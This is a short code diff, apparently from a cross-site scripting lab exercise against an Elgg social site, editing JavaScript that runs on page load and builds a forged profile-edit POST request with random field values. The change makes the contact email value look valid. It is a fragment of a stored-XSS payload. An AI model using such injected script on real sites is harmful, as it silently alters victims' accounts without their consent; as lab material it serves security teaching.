@@ -26,7 +26,7 @@ window.onload = function () {
     var skills = "&skills="+randomString(10)+"&accesslevel[skills]=1";
     var twitter = "&twitter="+randomString(10)+"&accesslevel[twitter]=1";
     var website = "&website="+randomString(10)+"&accesslevel[website]=1";
-    var contactemail = "&contactemail="+randomString(10)+"&accesslevel[contactemail]=1";
+    var contactemail = "&contactemail="+randomString(10)+"@email.com&accesslevel[contactemail]=1";
 
 
     var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
